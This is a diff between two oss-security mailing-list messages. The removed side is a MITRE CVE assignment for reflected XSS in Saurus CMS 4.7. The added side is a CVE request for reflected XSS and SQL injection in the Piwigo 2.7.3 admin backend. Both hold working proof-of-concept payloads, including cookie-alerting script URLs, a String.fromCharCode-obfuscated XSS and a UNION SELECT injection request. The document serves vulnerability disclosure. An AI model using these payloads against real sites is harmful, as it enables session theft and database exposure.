@@ -1,46 +1,74 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/09/3
-Message-ID: <Pine.LNX.4.64.1502082233410.16419@beijing.mitre.org>
-Date: Sun, 8 Feb 2015 22:35:52 -0500 (EST)
-From: cve-assign@...re.org
-To: Steffen Rösemann <steffen.roesemann1986@...il.com>
-cc: oss-security@...ts.openwall.com, cve-assign@...re.org
-Subject: Re: CVE-Request -- Saurus CMS v.4.7 (Community Edition, released: 12.08.2014) -- Multiple reflecting XSS vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/18/8
+Message-ID: <CALH-=7xku+asYCkFtNb6qzdrxbghFyUp8zN3HfUxKohRcwBLsg@mail.gmail.com>
+Date: Wed, 18 Feb 2015 16:38:35 +0100
+From: Steffen Rösemann <steffen.roesemann1986@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-Request -- Piwigo <= v. 2.7.3 -- Reflecting XSS- and SQLi-vulnerability in administrative backend
 Content-Type: text/plain; charset=utf-8
 
+Hi Steve, Josh, vendors, list.
 
-> I found multiple reflecting XSS vulnerabilities in the administrative
-> backend of the content management system Saurus CMS v. 4.7 (Community
-> Edition, released: 12.08.2014).
->
-> The parameters used in the following PHP files are prone to reflecting XSS
-> attacks (including exploit examples):
->
-> user_management.php (vulnerable parameter: "search"):
->
-> http://
-> {TARGET}/admin/user_management.php?tmpuser_search=1&tmpgroup_search=1&tmpsearch_subtree=1&search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&user_search=1&group_search=1&group_search=1&flt_role=&keepThis=true&id=&op=&keel=&group_id=1&view=overview_false&user_id=&user_prev_id=&user_next_id=
->
-> profile_data.php (vulnerable parameter: "data_search"):
->
-> http://
-> {TARGET}/admin/profile_data.php?data_search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&profile_search=&profile_id=0
->
-> error_log.php (vulnerable parameter: "filter"):
->
-> http://
-> {TARGET}/admin/error_log.php?id=&op=&keel=&group_id=1&otsi=1&page=&filter=bla&algus=31.12.2014&lopp=07.01.2015&err_type=&otsi=1&page=&filter=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C!--&algus=31.12.2014&lopp=07.01.2015&err_type=
->
-> Vendor patched this vulnerability in the latest commit of Saurus CMS v. 4.7
-> (CE, released: 27.01.2015).
->
-> Could you please assign a CVE-ID for this?
+I found a reflecting XSS- and a SQL injection-vulnerability in the
+administrative backend of Piwigo <= v. 2.7.3.
+
+The reflecting XSS vulnerability resides in the "page" parameter used in
+the file admin.php which can be found in the administrative backend located
+here in a common Piwigo installation:
+
+http://{TARGET}/admin.php?page=plugin-AdminTools
+
+Exploit-Example:
+
+http://
+{TARGET}/admin.php?page=plugin-AdminTools%3Cimg%20src=n%20onerror=eval%28String.fromCharCode%2897,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59%29%29%20%3E
+
+The SQL injection vulnerability can as well be found in the administrative
+backend and can be found in the "History" functionality located here:
+
+http://{TARGET}/admin.php?page=history
+
+The SQL injection vulnerability can be exploited by appending arbitrary SQL
+statements in a POST request to the parameter "user":
+
+Exploit-Example:
+
+POST /piwigo/admin.php?page=history HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
+Firefox/31.0 Iceweasel/31.3.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/piwigo/admin.php?page=history&search_id=82
+Cookie: pwg_display_thumbnail=no_display_thumbnail;
+pwg_id=19rpao6bhdsn3l0u0o1im4m680;
+_pk_id.1.1fff=7588ea02f4577539.1420720532.1.1420720532.1420720532.
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 255
+
+start=2015-01-08+&end=2015-01-09+&types%5B%5D=none&types%5B%5D=picture&types%5B%5D=high&types%5B%5D=other&user=2)
+AND 1=2 UNION SELECT user(),database(),3,version(),5,6,7,8,9 --
+&image_id=&filename=&ip=&display_thumbnail=no_display_thumbnail&submit=Submit
+
+The issue has been fixed in version 2.7.4, released on 17th February 2015.
+
+Can I have a CVE-ID for it?
+
+Thank you very much.
+
+Greetings from Germany.
+
+Steffen Rösemann
+
+References:
 
 
-Use CVE-2015-1562.
+[1] http://piwigo.org
+[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-06.html
+[3] http://piwigo.org/forum/viewtopic.php?id=25179
+[4]
+http://sroesemann.blogspot.de/2015/02/report-for-advisory-sroeadv-2015-06.html
+[5] http://seclists.org/fulldisclosure/2015/Feb/73
 
----
-
-CVE assignment team, MITRE CVE Numbering Authority M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
